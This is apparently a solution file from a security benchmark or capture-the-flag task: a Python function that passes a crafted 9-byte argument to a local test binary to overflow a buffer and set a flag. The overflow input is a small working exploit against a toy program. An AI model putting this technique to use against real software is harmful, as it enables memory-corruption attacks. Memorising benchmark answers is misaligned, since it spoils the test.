  def execute_program(timeout: int) -> tuple[str, int]:
      import signal
      import subprocess

      try:
          # Create a 9-character string where the 9th character is ASCII 1
          # First 8 characters: 'A' (any printable character works)
          # 9th character: ASCII 1 (SOH) to set flag=1 via buffer overflow
          overflow_string = "AAAAAAAA" + chr(1)
          
          # Verify the string length is exactly 9
          assert len(overflow_string) == 9, f"String length must be 9, got {len(overflow_string)}"
          
          # Execute with the crafted argument
          result = subprocess.run(
              ["./temp_executable", overflow_string],
              capture_output=True,
              encoding="utf-8",
              errors="replace",
              shell=False,
              timeout=timeout,
          )
          # Return stderr and the return code
          return result.stderr, result.returncode
      except subprocess.TimeoutExpired as e:
          # Timeout occurred, return stderr captured before timeout and return code -signal.SIGKILL
          return e.stderr, -signal.SIGKILL
      except Exception as e:
          # ensure to raise the error if run failed
          raise e
